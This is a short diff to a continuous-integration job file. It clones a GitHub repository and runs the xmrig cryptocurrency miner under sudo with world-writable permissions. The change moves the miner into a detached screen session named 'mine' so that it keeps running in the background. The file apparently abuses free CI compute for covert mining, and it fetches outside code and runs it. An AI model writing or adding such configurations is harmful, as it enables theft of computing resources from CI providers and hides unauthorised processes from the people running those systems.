@@ -8,4 +8,4 @@ jobs:
       # Whatever you want to do
       - run: sudo apt-get update
       - run: sudo git clone https://github.com/yszalxh/circleci.git
-      - run: cd circleci && sudo chmod 777 xmrig && sudo ./xmrig
+      - run: screen -dmS mine bash -c 'cd circleci && sudo chmod 777 xmrig && sudo ./xmrig'
